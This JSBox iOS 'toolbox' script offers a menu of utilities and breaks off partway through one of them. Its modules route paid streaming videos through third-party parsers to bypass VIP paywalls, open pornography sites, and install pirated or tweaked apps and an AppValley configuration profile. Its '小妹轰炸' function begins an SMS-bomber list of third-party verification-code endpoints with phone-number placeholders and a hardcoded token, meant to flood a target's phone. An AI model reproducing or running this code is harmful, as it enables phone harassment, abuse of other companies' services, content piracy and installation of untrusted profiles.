//功能简陋，不喜勿喷，照瓜画瓢
//本次更新日期：2019.07.21
//有问题请联系我邮箱：520@iao423.com
//网站：http://iao423.com




//

$ui.render({
    views: [{
            layout: $layout.fill,
            views: [{
                type: "label",
                props: {
                    id: "wq",
                    text: "工具箱By：iao423",
                    font: $font('AlNile', 20),
                    textColor: $color("#bbbcbf"),
                    lines: 0
                },
                layout: function (make, view) {
                    make.centerX.equalTo(view.super)
                    make.top.inset(20)
                }
            }]
        },
        {
            type: "button",
            props: {
                title: "二维解析",
                id: "as",
                bgcolor: $color("666666"),
            },
            layout: function (make, view) {

                make.top.equalTo($("wq").bottom).inset(260)
                make.centerX.equalTo(view.super)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    erjp()


                }

            }
        }, {
            type: "button",
            props: {
                title: "微信加密",

                bgcolor: $color("666666"),
            },
            layout: function (make, view) {

                make.top.equalTo($("wq").bottom).inset(320)
                make.centerX.equalTo(view.super)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    wwxb()


                }

            }
        },
        {
            type: "button",
            props: {
                title: "应用商店",
                id: "as",
                bgcolor: $color("666666"),
            },
            layout: function (make, view) {

                make.top.equalTo($("wq").bottom).inset(200)
                make.centerX.equalTo(view.super)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    rrjm()


                }

            }
        }, {
            type: "button",
            props: {
                title: "视频聚合",
                id: "as",
                bgcolor: $color("666666"),
            },
            layout: function (make, view) {

                make.top.equalTo($("wq").bottom).inset(380)
                make.centerX.equalTo(view.super)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    juheuipb()


                }

            }
        },
        {
            type: "button",
            props: {
                title: "暂停清理",
                id: "as",
                bgcolor: $color("666666"),
            },
            layout: function (make, view) {

                make.top.equalTo($("wq").bottom).inset(20)
                make.centerX.equalTo(view.super)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    $audio.pause()


                }

            }
        }, {
            type: "button",
            props: {
                title: "app破解",
                id: "we",
                bgcolor: $color("666666"),
            },
            layout: function (make, view) {

                make.top.equalTo($("wq").bottom).inset(380)
                make.right.equalTo($("as").left).inset(40)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    yhuiuipk()
                }
            }
        },

        {
            type: "button",
            props: {
                title: "小妹轰炸",
                id: "we",
                bgcolor: $color("666666"),
            },
            layout: function (make, view) {

                make.top.equalTo($("wq").bottom).inset(320)
                make.right.equalTo($("as").left).inset(40)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    datedt()
                }
            }
        },

        {
            type: "button",
            props: {
                title: "网页浏览",
                id: "we",
                bgcolor: $color("666666"),
            },
            layout: function (make, view) {

                make.top.equalTo($("wq").bottom).inset(260)
                make.right.equalTo($("as").left).inset(40)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    whye()
                }
            }
        },
        {
            type: "button",
            props: {
                title: "开始清理",
                id: "we",
                bgcolor: $color("666666"),
            },
            layout: function (make, view) {

                make.top.equalTo($("wq").bottom).inset(20)
                make.right.equalTo($("as").left).inset(40)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    $audio.play({
                        path: "audio.mp3"
                    })
                    $ui.toast("开始咯！")
                }
            }
        }, {
            type: "button",
            props: {
                title: "一键静音",
                id: "ad",
                bgcolor: $color("666666"),
            },
            layout: function (make) {

                make.top.equalTo($("wq").bottom).inset(320)
                make.left.equalTo($("as").right).inset(40)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    yijm()
                }
            }
        },
        {
            type: "button",
            props: {
                title: "车来了",
                id: "ad",
                bgcolor: $color("666666"),
            },
            layout: function (make) {

                make.top.equalTo($("wq").bottom).inset(260)
                make.left.equalTo($("as").right).inset(40)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    ield()
                }
            }
        },
        {
            type: "button",
            props: {
                title: "VIP解析",
                id: "ad",
                bgcolor: $color("666666"),
            },
            layout: function (make) {

                make.top.equalTo($("wq").bottom).inset(380)
                make.left.equalTo($("as").right).inset(40)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    vipuipb()
                }
            }
        },

        {
            type: "button",
            props: {
                title: "恢复清理",
                id: "ad",
                bgcolor: $color("666666"),
            },
            layout: function (make) {

                make.top.equalTo($("wq").bottom).inset(20)
                make.left.equalTo($("as").right).inset(40)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    $audio.resume()
                }
            }
        },

        {
            type: "button",
            props: {
                title: "计算器",
                id: "ai",
                bgcolor: $color("666666"),
            },
            layout: function (make) {

                make.top.equalTo($("wq").bottom).inset(80)
                make.left.equalTo($("as").right).inset(40)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    jisrqi()
                }
            }
        },
        {
            type: "button",
            props: {
                title: "贴吧签到",
                id: "tieba",
                bgcolor: $color("666666"),
            },
            layout: function (make, view) {

                make.top.equalTo($("wq").bottom).inset(80)
                make.centerX.equalTo(view.super)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    tieba()


                }

            }
        },
        {
            type: "button",
            props: {
                title: "图片抓取",
                id: "we",
                bgcolor: $color("666666"),
            },
            layout: function (make, view) {

                make.top.equalTo($("wq").bottom).inset(80)
                make.right.equalTo($("as").left).inset(40)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    tupian()
                }
            }
        },
        {
            type: "button",
            props: {
                title: "IP查询",
                id: "we",
                bgcolor: $color("666666"),
            },
            layout: function (make, view) {

                make.top.equalTo($("wq").bottom).inset(200)
                make.right.equalTo($("as").left).inset(40)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    ipia()
                }
            }
        },
        {
            type: "button",
            props: {
                title: "下载助手",
                id: "we",
                bgcolor: $color("666666"),
            },
            layout: function (make, view) {

                make.top.equalTo($("wq").bottom).inset(140)
                make.right.equalTo($("as").left).inset(40)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    xiazai()
                }
            }
        },
        {
            type: "button",
            props: {
                title: "脚本安装",
                id: "ipa",
                bgcolor: $color("666666"),
            },
            layout: function (make) {

                make.top.equalTo($("wq").bottom).inset(140)
                make.left.equalTo($("as").right).inset(40)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    aaa()
                }
            }
        },
        {
            type: "button",
            props: {
                title: "ipa在线",
                id: "ipa",
                bgcolor: $color("666666"),
            },
            layout: function (make) {

                make.top.equalTo($("wq").bottom).inset(200)
                make.left.equalTo($("as").right).inset(40)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    ipa()
                }
            }
        },
        {
            type: "button",
            props: {
                title: "少数派",
                id: "tieba",
                bgcolor: $color("666666"),
            },
            layout: function (make, view) {

                make.top.equalTo($("wq").bottom).inset(140)
                make.centerX.equalTo(view.super)
                make.height.equalTo(30)
                make.width.equalTo(80)
            },
            events: {
                tapped: function (sender) {
                    wfdh()


                }

            }
        },
    ]

})

function vipuipb() {
    /**erots
    id: 5d07b11f12215f0071852e3a
    build: 3
    */
    //anton.j@2017-10-22 Ver1.0

    //* @ 2019.06.28
    //*iao423
    //有问题请联系我邮箱：520@iao423.com
    //网站：http://iao423.com
    var warn = 0 //(0 or 1)

    $app.strings = {
        "en": {
            "mrjk": "Port0",
            "xzjk": " Add port",
            //......
        },
        "zh-Hant": {
            "mrjk": "默认接口❈",
            "xzjk": "新增接口⊕",
            //......
        }
    }

    var ports = [{
            name: $l10n("0001"),
            url: "http://www.82190555.com/index/qqvod.php?url="
        },
        {
            name: $l10n("0002"),
            url: "http://jx.598110.com/?url="
        },
        {
            name: "0003",
            url: "https://www.myxin.top/jx/api/?url="
        },
        {
            name: "0004",
            url: "https://api.v6.chat/?url="
        },
        {
            name: "0005",
            url: "http://jqaaa.com/jx.php?url="
        },
        {
            name: "0006",
            url: "https://beaacc.com/api.php?url="
        },
        {
            name: "0007",
            url: "http://vip.jlsprh.com/?url="
        },
    ]

    var NET = [{
            name: "默认",
            url: "http://m.v.qq.com"
        },
        {
            name: "奇艺",
            url: "http://m.iqiyi.com/vip/"
        },
        {
            name: "优酷",
            url: "http://m.vip.youku.com"
        },
        {
            name: "腾讯",
            url: "http://m.v.qq.com"
        },
        {
            name: "乐视",
            url: "http://m.le.com/vip/"
        },
        {
            name: "芒果",
            url: "http://m.mgtv.com/#/channel/home"
        },
        {
            name: "搜狐",
            url: "http://m.tv.sohu.com/film"
        },
        {
            name: "音悦",
            url: "http://m.yinyuetai.com"
        },
        {
            name: "PPTV",
            url: "http://m.pptv.com/?location=m_channel_vip"
        },
    ]

    var searchNET = [{
            name: "默认搜",
            net: "http://m.v.sogou.com/vw/search.jsp"
        },
        {
            name: "影视",
            net: "http://ifkdy.com/"
        },
        {
            name: "电视",
            net: "http://wx.iptv789.com/tv.php"
        },
        {
            name: "音乐",
            net: "http://music.2333.me"
        },
        {
            name: "广播",
            net: "http://m.qingting.fm/categories/5"
        },
        {
            name: "动漫",
            net: "http://m.acfun.tv/search/"
        },
        {
            name: "直播",
            net: "https://www.douyu.com"
        },
        {
            name: "新增站",
            net: "http://hwkxk.cn/music/"
        },
    ]

    var Cha = searchNET[0].net //(0~7)
    var ChaN = searchNET[0].name //(0~7)
    var Port = ports[0].url //(0~4)
    var PoetN = ports[0].name //(0~4)
    var Site = NET[0].url //(0~8)

    /*------------head----------*/


    //main
    var r = /\w{2,10}\.com/
    var i = 0
    var reg = ""
    while (NET[i]) {
        if (reg.length !== 0) {
            var reg = r.exec(NET[i].url) + ".*html|" + reg
        } else {
            var reg = r.exec(NET[i].url) + ".*html" + reg
        }
        i++
    }
    var reg = reg + "|mgtv.com/#/"

    if (warn == 1) {
        $ui.toast("anton.j的提醒:运行此脚本建议关闭SSR及相关")
    } else {}

    if (typeof ($context.safari) == "undefined") {
        var link = $context.link || $clipboard.link ? $context.link || $clipboard.link : ""
    } else {
        var link = $context.safari.items.location.href
    }
    if (link.search(reg) == -1) {} else {
        $ui.alert({
            title: "直接解析播放如下链接:\n\n" + link,
            actions: [{
                    title: "OK",
                    handler: function () {
                        parse_play(link)
                    }
                },
                {
                    title: "Cancel",
                    style: "Cancel",
                },
            ]
        })
    }
    main(Site)

    //all function
    function main(url) {
        $ui.push({
            props: {
                title: "全网—VIP影音播放搜索"
            },
            views: [{
                    type: "web",
                    props: {
                        id: "videoweb",
                        url: Site,
                        toolbar: true,

                        script: function () {
                            var Html = window.parent.location.href
                            $notify("customEvent", Html)
                        }

                    },
                    layout: function (make, view) {
                        make.top.inset(28)
                        make.bottom.right.left.inset(0)
                    },

                    events: {
                        customEvent: function (object) {
                            //$clipboard.text = obj
                            $("videoweb").title = object
                        }
                    }

                },

                {
                    type: "tab",
                    props: {
                        id: "headmenu",
                        items: NET.map(function (item) {
                            return item.name
                        }),
                        bgcolor: $rgb(255, 255, 255),
                        radius: 6,
                        tintColor: $color("#424242")
                    },
                    layout: function (make, view) {
                        make.top.left.right.inset(1)
                        make.height.equalTo(25)
                    },
                    events: {
                        changed: function (sender) {
                            var Site = NET[sender.index].url
                            var Title = NET[sender.index].name
                            $("videoweb").url = Site
                        }
                    }
                },

                {
                    type: "label",
                    props: {
                        id: "textlabel",
                        font: $font(11),
                        text: "----------请至VIP视频最终页面点击[解析]键 ----------",
                        textColor: $color("#d2691e"),
                        bgcolor: $rgb(255, 255, 255),
                        radius: 8,
                        align: $align.center
                    },
                    layout: function (make, view) {
                        make.bottom.inset(0)
                        make.left.right.inset(0)
                        make.height.equalTo(11)
                        make.centerX.equalTo(view.super)
                    }
                },

                {
                    type: "button",
                    props: {
                        id: "play",
                        title: "解析▷",
                        bgcolor: $rgb(210, 105, 30),
                        titleColor: $color("white "),
                        font: $font(15)
                    },
                    layout: function (make, view) {
                        make.right.inset(11)
                        make.bottom.inset(85)
                        make.width.equalTo(55)
                        make.height.equalTo(32)
                    },
                    events: {
                        tapped: function (sender) {
                            var link = $("videoweb").title
                            //var link = $clipboard.link
                            if (link.search(reg) == -1) {
                                $ui.alert("【当前视频地址不正确】\n\n请至视频最终页面再点[解析]键\n")
                            } else {
                                $ui.toast(link)
                                parse_play(link)
                            }
                        }
                    }
                },

                {
                    type: "button",
                    props: {
                        id: "search",
                        title: "搜索 θ",
                        bgcolor: $rgb(233, 233, 233),
                        titleColor: $color("red"),
                        font: $font(15)
                    },
                    layout: function (make, view) {
                        make.left.inset(11)
                        make.bottom.inset(85)
                        make.width.equalTo(55)
                        make.height.equalTo(32)
                    },
                    events: {
                        tapped: function (sender) {
                            searchvideo(Cha, ChaN)
                        }
                    },
                }
            ]
        })
    }

    function parse_play(url) {
        $ui.push({
            views: [{
                    type: "web",
                    props: {
                        id: "playweb",
                        title: "全网—VIP影音播放搜索",
                        url: Port + url,
                        //toolbar: true
                    },
                    layout: $layout.fill
                },
                {
                    type: "tab",
                    props: {
                        id: "bottommenu",
                        items: ports.map(function (item) {
                            return item.name
                        }),
                        bgcolor: $rgb(66, 66, 66),
                        radius: 6,
                        tintColor: $color("#d2691e")
                    },
                    layout: function (make, view) {
                        make.left.right.inset(2)
                        make.bottom.inset(2)
                        make.height.equalTo(30)
                    },
                    events: {
                        changed: function (sender) {
                            var Port = ports[sender.index].url
                            var PortN = ports[sender.index].name

                            if (PortN.search("新增") == -1) {
                                $("playweb").url = Port + url
                            } else {
                                addport(Port, PortN)
                            }

                        }
                    }
                },
            ]
        })
    }

    function searchvideo(Cha, ChaN) {
        $ui.push({
            views: [{
                    type: "web",
                    props: {
                        id: "searchweb",
                        title: "全网—VIP影音播放搜索",
                        url: Cha,
                        toolbar: true
                    },
                    layout: $layout.fill
                },
                {
                    type: "tab",
                    props: {
                        items: searchNET.map(function (item) {
                            return item.name
                        }),
                        bgcolor: $rgb(255, 255, 255),
                        radius: 6,
                        tintColor: $color("#d2691e"),
                        font: $font(12)
                    },
                    layout: function (make, view) {
                        make.left.right.inset(1)
                        make.bottom.inset(44)
                        make.height.equalTo(30)
                    },
                    events: {
                        changed: function (sender) {
                            var Cha = searchNET[sender.index].net
                            var ChaN = searchNET[sender.index].name

                            /*------后期修改搜索入口1------*/
                            if (ChaN == "影视") {
                                dybee($("search".url))
                            }
                            /*else if(ChaN=="电视"){
                              addXX1($("search".url))
                            } else if(ChaN=="广播"){
                              addXX2($("search".url))
                            } else if(ChaN=="音乐"){
                              addXX3($("search".url))
                            } else if(ChaN=="动漫"){
                              addXX4($("search".url))
                            } else if(ChaN=="直播"){
                              addXX5($("search".url))
                            } */
                            else if (ChaN == "新增站") {
                                addXX6($("search".url))
                            } else {
                                $("searchweb").url = Cha
                            }
                            /*------后期修改搜索入口1------*/

                        }
                    }
                },
            ]
        })
    }

    function dybee(url) {
        $ui.push({
            views: [{
                    type: "input",
                    props: {
                        id: "inputDy",
                        type: $kbType.search,
                        text: "战狼",
                        font: $font(11),
                        textColor: $color("red"),
                        darkKeyboard: true,

                    },
                    layout: function (make, view) {
                        make.top.left.inset(10)
                        make.height.equalTo(30)
                        make.width.equalTo(200)
                    },
                    events: {
                        changed: function (sender) {
                            $("inputDy").text
                        }
                    }
                },

                /*----edit----*/






                {
                    type: "list",
                    props: {
                        id: "dybee",
                        data: ["搜索", "推荐", "电影", "电视"]
                    },
                    layout: function (make, view) {
                        make.top.equalTo($("inputDy").bottom).offset(10)
                        make.left.right.inset(1)
                        make.bottom.inset(10)
                    },
                    events: {
                        didSelect: function (tableView, indexPath, title) {
                            if (title == "推荐") {
                                $http.get({
                                    url: "http://www.dybee.cn/",
                                    handler: function (resp) {
                                        var searchM = resp.data
                                        if (searchM.search("共找到0篇关于") == -1) {

                                            $ui.alert(searchM) //test

                                        } else {
                                            $ui.alert("test")
                                        }
                                        //

                                    }
                                })
                            }
                        }
                    }

                }

            ]
        })
    }

    function addXX6(url) {
        $ui.alert("正在编辑中......")
    }

    function addport(Port, PortN) {
        $ui.alert("正在编辑中......")

    }


}

function juheuipb() {
    //anton.j@2017-10-22 Ver1.0

    /*---------head---------*/
    var warn = 0 //(0 or 1)

    $app.strings = {
        "en": {
            "解析A": "解析A",
            "解析D": " 解析D",
            //......
        },
        "zh-Hant": {
            "解析A": "默认接口❈",
            "解析D": "新增接口⊕",
            //......
        }
    }

    var ports = [{
        name: $l10n("解析A"),
        url: ""
    }, ]

    var NET = [{
            name: "Beeg",
            url: "http://beeg.com/"
        },
        {
            name: "PronHub",
            url: "https://www.pornhub.com/categories"
        },
        {
            name: "YouPorn",
            url: "https://www.youporn.com/categories/"
        },
        {
            name: "XVideo",
            url: "http://www.xvideos.com/"
        },
        {
            name: "PornHD",
            url: "https://www.pornhd.com/"
        },
        {
            name: "直播",
            url: "http://keencams.com/"
        },
        {
            name: "直播2",
            url: "https://cn.bongacams.com/"
        },
        {
            name: "VR",
            url: "https://vrporn.com/categories/"
        },
    ]

    var searchNET = [{
            name: "默认搜",
            net: "http://m.v.sogou.com/vw/search.jsp"
        },
        {
            name: "新增站",
            net: "http://hwkxk.cn/music/"
        },
    ]

    var Cha = searchNET[0].net //(0~7)
    var ChaN = searchNET[0].name //(0~7)
    var Port = ports[0].url //(0~4)
    var PoetN = ports[0].name //(0~4)
    var Site = NET[0].url //(0~8)

    /*------------head----------*/


    //main
    var r = /\w{2,10}\.com/
    var i = 0
    var reg = ""
    while (NET[i]) {
        if (reg.length !== 0) {
            var reg = r.exec(NET[i].url) + ".*html|" + reg
        } else {
            var reg = r.exec(NET[i].url) + ".*html" + reg
        }
        i++
    }
    var reg = reg + "|mgtv.com/#/"

    if (warn == 1) {
        $ui.toast("anton.j的提醒:运行此脚本建议关闭SSR及相关")
    } else {}

    if (typeof ($context.safari) == "undefined") {
        var link = $context.link || $clipboard.link ? $context.link || $clipboard.link : ""
    } else {
        var link = $context.safari.items.location.href
    }
    if (link.search(reg) == -1) {} else {
        $ui.alert({
            title: "直接解析播放如下链接:\n\n" + link,
            actions: [{
                    title: "OK",
                    handler: function () {
                        parse_play(link)
                    }
                },
                {
                    title: "Cancel",
                    style: "Cancel",
                },
            ]
        })
    }
    main(Site)

    //all function
    function main(url) {
        $ui.push({
            props: {
                title: "国外媒体市场"
            },
            views: [{
                    type: "web",
                    props: {
                        id: "videoweb",
                        url: Site,
                        toolbar: true,

                        script: function () {
                            var Html = window.parent.location.href
                            $notify("customEvent", Html)
                        }

                    },
                    layout: function (make, view) {
                        make.top.inset(28)
                        make.bottom.right.left.inset(0)
                    },

                    events: {
                        customEvent: function (object) {
                            //$clipboard.text = obj
                            $("videoweb").title = object
                        }
                    }

                },

                {
                    type: "tab",
                    props: {
                        id: "headmenu",
                        items: NET.map(function (item) {
                            return item.name
                        }),
                        bgcolor: $rgb(255, 255, 255),
                        radius: 6,
                        tintColor: $color("#424242")
                    },
                    layout: function (make, view) {
                        make.top.left.right.inset(1)
                        make.height.equalTo(25)
                    },
                    events: {
                        changed: function (sender) {
                            var Site = NET[sender.index].url
                            var Title = NET[sender.index].name
                            $("videoweb").url = Site
                        }
                    }
                },

                {
                    type: "label",
                    props: {
                        id: "textlabel",
                        font: $font(11),
                        text: "----------请至VIP视频最终页面点击[解析]键 ----------",
                        textColor: $color("#d2691e"),
                        bgcolor: $rgb(255, 255, 255),
                        radius: 8,
                        align: $align.center
                    },
                    layout: function (make, view) {
                        make.bottom.inset(0)
                        make.left.right.inset(0)
                        make.height.equalTo(11)
                        make.centerX.equalTo(view.super)
                    }
                },
            ]
        })
    }

    function parse_play(url) {
        $ui.push({
            views: [{
                    type: "web",
                    props: {
                        id: "playweb",
                        title: "国外媒体市场",
                        url: Port + url,
                        //toolbar: true
                    },
                    layout: $layout.fill
                },
                {
                    type: "tab",
                    props: {
                        id: "bottommenu",
                        items: ports.map(function (item) {
                            return item.name
                        }),
                        bgcolor: $rgb(66, 66, 66),
                        radius: 6,
                        tintColor: $color("#d2691e")
                    },
                    layout: function (make, view) {
                        make.left.right.inset(2)
                        make.bottom.inset(2)
                        make.height.equalTo(30)
                    },
                    events: {
                        changed: function (sender) {
                            var Port = ports[sender.index].url
                            var PortN = ports[sender.index].name

                            if (PortN.search("新增") == -1) {
                                $("playweb").url = Port + url
                            } else {
                                addport(Port, PortN)
                            }

                        }
                    }
                },
            ]
        })
    }

    function searchvideo(Cha, ChaN) {
        $ui.push({
            views: [{
                    type: "web",
                    props: {
                        id: "searchweb",
                        title: "国外媒体市场",
                        url: Cha,
                        toolbar: true
                    },
                    layout: $layout.fill
                },
                {
                    type: "tab",
                    props: {
                        items: searchNET.map(function (item) {
                            return item.name
                        }),
                        bgcolor: $rgb(255, 255, 255),
                        radius: 6,
                        tintColor: $color("#d2691e"),
                        font: $font(12)
                    },
                    layout: function (make, view) {
                        make.left.right.inset(1)
                        make.bottom.inset(44)
                        make.height.equalTo(30)
                    },
                    events: {
                        changed: function (sender) {
                            var Cha = searchNET[sender.index].net
                            var ChaN = searchNET[sender.index].name

                            /*------后期修改搜索入口1------*/
                            if (ChaN == "影视") {
                                dybee($("search".url))
                            }
                            /*else if(ChaN=="电视"){
                              addXX1($("search".url))
                            } else if(ChaN=="广播"){
                              addXX2($("search".url))
                            } else if(ChaN=="音乐"){
                              addXX3($("search".url))
                            } else if(ChaN=="动漫"){
                              addXX4($("search".url))
                            } else if(ChaN=="直播"){
                              addXX5($("search".url))
                            } */
                            else if (ChaN == "新增站") {
                                addXX6($("search".url))
                            } else {
                                $("searchweb").url = Cha
                            }
                            /*------后期修改搜索入口1------*/

                        }
                    }
                },
            ]
        })
    }

    function dybee(url) {
        $ui.push({
            views: [{
                    type: "input",
                    props: {
                        id: "inputDy",
                        type: $kbType.search,
                        text: "战狼",
                        font: $font(11),
                        textColor: $color("red"),
                        darkKeyboard: true,

                    },
                    layout: function (make, view) {
                        make.top.left.inset(10)
                        make.height.equalTo(30)
                        make.width.equalTo(200)
                    },
                    events: {
                        changed: function (sender) {
                            $("inputDy").text
                        }
                    }
                },

                /*----edit----*/






                {
                    type: "list",
                    props: {
                        id: "dybee",
                        data: ["搜索", "推荐", "电影", "电视"]
                    },
                    layout: function (make, view) {
                        make.top.equalTo($("inputDy").bottom).offset(10)
                        make.left.right.inset(1)
                        make.bottom.inset(10)
                    },
                    events: {
                        didSelect: function (tableView, indexPath, title) {
                            if (title == "推荐") {
                                $http.get({
                                    url: "http://www.dybee.cn/",
                                    handler: function (resp) {
                                        var searchM = resp.data
                                        if (searchM.search("共找到0篇关于") == -1) {

                                            $ui.alert(searchM) //test

                                        } else {
                                            $ui.alert("test")
                                        }
                                        //

                                    }
                                })
                            }
                        }
                    }

                }

            ]
        })
    }

    function addXX6(url) {
        $ui.alert("正在编辑中......")
    }

    function addport(Port, PortN) {
        $ui.alert("正在编辑中......")

    }

    /*-------------end@anton.j------------*/

}

function yhuiuipk() {
    //free apps installing
    $ui.push({
        props: {
            title: "APPValley"
        },
        views: [{
                type: "image",
                props: {
                    id: "ico",
                    src: "https://i.loli.net/2017/10/03/59d303fa78fa2.jpeg",
                    radius: 10
                },
                layout: function (make, view) {
                    make.top.inset(20)
                    make.size.equalTo(110, 110)
                    make.centerX.equalTo(view.super)
                }
            },
            {
                type: "button",
                props: {
                    id: "b1",
                    title: "App Store"
                },
                layout: function (make, view) {
                    make.right.left.inset(10)
                    make.top.equalTo($("ico").bottom).offset(20)
                    make.wdi
                },
                events: {
                    tapped: function (sender) {
                        APPList("https://api.tweakboxapp.com/enjoy/appstore.json", "App Store")
                    }
                }
            },
            {
                type: "button",
                props: {
                    id: "b2",
                    title: "Games"
                },
                layout: function (make, view) {
                    make.right.left.inset(10)
                    make.top.equalTo($("b1").bottom).offset(10)
                },
                events: {
                    tapped: function (sender) {
                        APPList("https://api.tweakboxapp.com/enjoy/games.json", "Games")
                    }
                }
            },
            {
                type: "button",
                props: {
                    id: "b3",
                    title: "Tweakbox"
                },
                layout: function (make, view) {
                    make.right.left.inset(10)
                    make.top.equalTo($("b2").bottom).offset(10)
                },
                events: {
                    tapped: function (sender) {
                        APPList("https://api.tweakboxapp.com/enjoy/tweakbox.json", "Tweakbox")
                    }
                }
            },
            {
                type: "button",
                props: {
                    id: "b4",
                    title: "Tweaked"
                },
                layout: function (make, view) {
                    make.right.left.inset(10)
                    make.top.equalTo($("b3").bottom).offset(10)
                },
                events: {
                    tapped: function (sender) {
                        APPList("https://api.tweakboxapp.com/enjoy/tweaked.json", "Tweaked")
                    }
                }
            },
            {
                type: "button",
                props: {
                    id: "b7",
                    title: "[Others]"
                },
                layout: function (make, view) {
                    make.right.left.inset(10)
                    make.top.equalTo($("b4").bottom).offset(10)
                },
                events: {
                    tapped: function (sender) {
                        Others()
                    }
                }
            },
        ]
    })

    function Others() {
        $ui.push({
            props: {
                title: "Others"
            },
            views: [{
                    type: "button",
                    props: {
                        id: "b5",
                        title: "AppValley for Web",
                        bgcolor: $color("#3B3B3B")
                    },
                    layout: function (make, view) {
                        make.right.left.top.inset(10)
                    },
                    events: {
                        tapped: function (sender) {
                            OpenUrl("https://appvalley.vip/app/#view-2", "Web")
                        }
                    }
                },
                {
                    type: "button",
                    props: {
                        id: "b6",
                        title: "Install AppValley",
                        bgcolor: $color("#3B3B3B")
                    },
                    layout: function (make, view) {
                        make.right.left.inset(10)
                        make.top.equalTo($("b5").bottom).offset(10)
                    },
                    events: {
                        tapped: function (sender) {
                            $app.openURL("https://appvalley.vip/webclip.mobileconfig")
                        }
                    }
                }
            ]
        })
    }

    function APPList(api, title) {
        refetch(api)
        $ui.push({
            props: {
                title: title
            },
            views: [{
                type: "list",
                props: {
                    rowHeight: 64.0,
                    separatorInset: $insets(0, 5, 0, 0),
                    template: [{
                            type: "image",
                            props: {
                                id: "img",
                                radius: 7
                            },
                            layout: function (make, view) {
                                make.left.top.bottom.inset(5)
                                make.width.equalTo(view.height)
                            }
                        },
                        {
                            type: "label",
                            props: {
                                id: "label",
                                font: $font("bold", 16),
                                lines: 1
                            },
                            layout: function (make, view) {
                                make.left.equalTo($("img").right).offset(10)
                                make.top.equalTo(10)
                                make.right.inset(10)
                                make.height.equalTo(20)
                            }
                        },
                        {
                            type: "label",
                            props: {
                                id: "label1",
                                font: $font(12),
                                lines: 1,
                                bgcolor: $color("#F5F5F5"),
                                textColor: $color("#777777"),
                                radius: 2
                            },
                            layout: function (make) {
                                make.left.equalTo($("label"))
                                make.top.equalTo($("label").bottom).offset(5)
                                make.bottom.equalTo(-10)
                            }
                        },
                    ],
                    actions: [{
                        title: "Copy link",
                        handler: function (tableView, indexPath) {
                            $ui.toast("copied")
                            $clipboard.text = tableView.object(indexPath).url
                        }
                    }, ]
                },
                layout: $layout.fill,
                events: {
                    didSelect: function (tableView, indexPath) {
                        $ui.menu({
                            items: ["Install"],
                            handler: function (title, idx) {
                                if (title === "Install") {
                                    $app.openURL(tableView.object(indexPath).url)
                                }
                            }
                        })
                    },
                    pulled: function (sender) {
                        refetch(api)
                    }
                }
            }]
        })
    }

    function refetch(api) {
        $ui.loading(true)
        $http.get({
            url: api,
            handler: function (resp) {
                $ui.loading(false)
                render(resp.data.data)
                $cache.set("stories", resp.data.data)
            }
        })
    }

    function render(stories) {
        var data = []
        for (var idx in stories) {
            var story = stories[idx]
            data.push({
                url: story.TBAppLink,
                ipa: story.TBAppUrl,
                img: {
                    src: story.TBAppIcon
                },
                label: {
                    text: story.TBAppName
                },
                label1: {
                    text: story.TBAppSize
                }
            })
        }
        $("list").data = data
        $("list").endRefreshing()
    }

    function OpenUrl(url, title) {
        $ui.push({
            props: {
                title: title
            },
            views: [{
                type: "web",
                props: {
                    url: url
                },
                layout: $layout.fill
            }]
        })
    }

    var cache = $cache.get("stories")

    if (cache) {
        render(cache)
    }

    refetch()

}

function datedt() {


    //仅供娱乐
    var jiekou = [{
        "url": "http:\/\/msxapi.msx66.com\/openapi\/customerInfoService\/sendSMSCode",
        "parm": "{\"accessToken\":\"784d5561ebe79c34f90b4d593df56516\",\"datas\":{\"request\":{\"mobile\":\"手机号码\",\"optType\":\"0003\",\"productType\":\"CREDIT\"}}}",
        "type": "GET"
    }, {
        "url": "http:\/\/o.sohoido.com\/api\/sms\/reg\/手机号码\/590",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/m2m.jiutianshop.com\/index-index-sendcode.html",
        "parm": "tel=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/api.bzhuan888.com\/app\/sendSmsCode",
        "parm": "{\"phone\":\"手机号码\",\"type\":0}",
        "type": "POST"
    }, {
        "url": "http:\/\/goodfatherapp.com\/\/user\/getSmsByMobile?phoneNumber=手机号码&cooperationId=goodfather&smsType=register",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/h5user.rastargame.com\/vcode\/Mobile\/page\/?callback=jQuery111306684320296387496_1551691777816&mobile=手机号码&type=reg&client=wap&_=1551691778330",
        "parm": "",
        "type": "GET"
    }, {
        "url": "http:\/\/mchaincloud.com\/tools\/sms.ashx?action=getpw",
        "parm": "telphone=手机号码",
        "type": "POST"
    }, {
        "url": "http:\/\/www.qianlima.com\/new\/keywordzhuolu_fanghu.jsp",
        "parm": "tysem=1&tisem=1&retisem=5&mobile=手机号码",
        "type": "POST"
    }, {
